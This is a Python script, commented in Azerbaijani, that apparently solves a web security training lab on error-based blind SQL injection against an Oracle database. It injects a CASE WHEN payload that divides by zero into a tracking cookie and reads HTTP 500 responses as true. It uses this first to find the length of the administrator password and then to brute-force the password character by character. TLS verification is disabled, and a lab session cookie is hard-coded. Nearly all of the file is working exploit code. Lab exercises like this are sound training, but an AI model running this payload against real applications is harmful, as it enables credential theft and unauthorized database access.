"""
Blind SQL Injection - Error-based (Oracle)
Lab: Blind SQL injection with conditional errors

Siqnal mexanizmi:
  Şərt TRUE  → TO_CHAR(1/0) → Division by zero → HTTP 500
  Şərt FALSE → ''           → Normal           → HTTP 200

Oracle CASE WHEN sintaksisi işlənir.
"""
import requests
import string
import urllib3
urllib3.disable_warnings()

HOST     = "0adf0030042f35e08080083200850021.web-security-academy.net"
SESSION  = "SOhU9fo45ZWP04n1Th4dIe5i42tReytT"
TRACKING = "iY3ewlCa06vbJ8XN"
CHARS    = string.ascii_lowercase + string.digits   # a-z + 0-9
URL      = f"https://{HOST}/"

def check(condition: str) -> bool:
    """TRUE isə 500, FALSE isə 200 qaytarır."""
    payload = (
        f"'||(SELECT CASE WHEN ({condition})"
        f" THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    )
    cookies = {
        "TrackingId": TRACKING + payload,
        "session": SESSION,
    }
    r = requests.get(URL, cookies=cookies, verify=False, timeout=10)
    return r.status_code == 500

# 1. Şifre uzunluğunu tap
print("[*] Şifre uzunluğu axtarılır...")
pwd_len = 0
for n in range(1, 31):
    cond = f"(SELECT LENGTH(password) FROM users WHERE username='administrator')={n}"
    if check(cond):
        pwd_len = n
        print(f"[+] Şifre uzunluğu: {pwd_len}")
        break

if not pwd_len:
    print("[-] Uzunluq tapılmadı!")
    exit(1)

# 2. Hər simvolu brute-force et
print("[*] Şifre simvolları brute-force edilir...")
password = ""
for pos in range(1, pwd_len + 1):
    for ch in CHARS:
        cond = (
            f"(SELECT SUBSTR(password,{pos},1)"
            f" FROM users WHERE username='administrator')='{ch}'"
        )
        if check(cond):
            password += ch
            print(f"[+] Pozisiya {pos:2d}: '{ch}'  →  Şifre: {password}", flush=True)
            break
    else:
        print(f"[?] Pozisiya {pos}: simvol tapılmadı!")
        password += "?"

print(f"\n[✓] Tapılan şifre: {password}")
